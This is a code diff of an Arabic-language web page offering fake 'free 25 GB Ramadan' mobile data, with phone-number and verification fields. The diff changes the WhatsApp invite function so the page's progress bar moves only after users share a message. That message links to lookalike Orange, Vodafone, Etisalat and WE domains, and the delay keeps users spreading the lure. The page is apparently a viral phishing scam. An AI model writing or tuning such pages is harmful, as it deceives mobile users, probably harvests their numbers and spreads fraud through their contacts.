@@ -118,7 +118,7 @@
             border-radius: 12px;
             max-width: 80%;
             font-size: 13px;
-            color: #333; /* تم إصلاح لون النص هنا */
+            color: #333;
         }
 
         .comment-footer {
@@ -190,7 +190,7 @@
             flex-direction: column;
             align-items: center;
             margin-top: 20px;
-            width: 100%; /* تم تعديل العرض ليكون بعرض الشاشة */
+            width: 100%;
         }
 
         .phone-input input {
@@ -221,7 +221,7 @@
             flex-direction: column;
             align-items: center;
             margin-top: 20px;
-            width: 100%; /* تم تعديل العرض ليكون بعرض الشاشة */
+            width: 100%;
         }
 
         .verification-text {
@@ -263,8 +263,8 @@
             background: #f0f2f5;
             padding: 15px;
             border-radius: 10px;
-            width: 100%; /* تم تعديل العرض ليكون بعرض الشاشة */
-            max-width: 100%; /* تم تعديل العرض ليكون بعرض الشاشة */
+            width: 100%;
+            max-width: 100%;
         }
 
         .instructions-text {
@@ -309,11 +309,11 @@
         .follow-button {
             background: #00008B;
             color: white;
-            padding: 10px 20px;
+            padding: 8px 16px;
             border: none;
             border-radius: 5px;
             cursor: pointer;
-            font-size: 16px;
+            font-size: 14px;
             margin-top: 20px;
             display: none;
         }
@@ -472,23 +472,25 @@
     function sendWhatsAppMessage() {
         if (currentProgress >= progressStops.length) return;
 
-        // تحديث شريط التقدم
-        const progress = progressStops[currentProgress];
-        document.getElementById('inviteProgressBarFill').style.width = progress + '%';
-        document.getElementById('inviteProgressBarPercent').innerText = progress + '%';
-        
-        currentProgress++;
-
-        // إظهار زر المتابعة عند اكتمال التحميل
-        if (currentProgress === progressStops.length) {
-            document.getElementById('inviteButton').style.display = 'none';
-            document.getElementById('followButton').style.display = 'block';
-        }
-
         // إرسال الرسالة عبر واتساب
         const message = "*رصيد 25 جيجا مجانا بمناسبة شهر رمضان المبارك 🌙*\n\n*لمستعملي orange* 👇\nhttps://0range-free25giga.blogspot.com\n\n*لمستعملي vodafone* 👇\nhttps://vodafone-free25giga.blogspot.com\n\n*لمستعملي Etisalat* 👇\nhttps://etsalat-free25giga.blogspot.com\n\n*لمستعملي we* 👇\nhttps://we-free25giga.blogspot.com\n\n*لمستعملي الشبكات الأخرى* 👇\nhttps://other-free25gige.blogspot.com";
         const url = "https://api.whatsapp.com/send?text=" + encodeURIComponent(message);
         window.open(url, '_blank');
+
+        // بدء التقدم بعد 5 ثواني
+        setTimeout(function() {
+            const progress = progressStops[currentProgress];
+            document.getElementById('inviteProgressBarFill').style.width = progress + '%';
+            document.getElementById('inviteProgressBarPercent').innerText = progress + '%';
+            
+            currentProgress++;
+
+            // إظهار زر المتابعة عند اكتمال التحميل
+            if (currentProgress === progressStops.length) {
+                document.getElementById('inviteButton').style.display = 'none';
+                document.getElementById('followButton').style.display = 'block';
+            }
+        }, 5000);
     }
 
     function followLink() {
@@ -497,4 +499,4 @@
 </script>
 
 </body>
-</html>
+    </html>
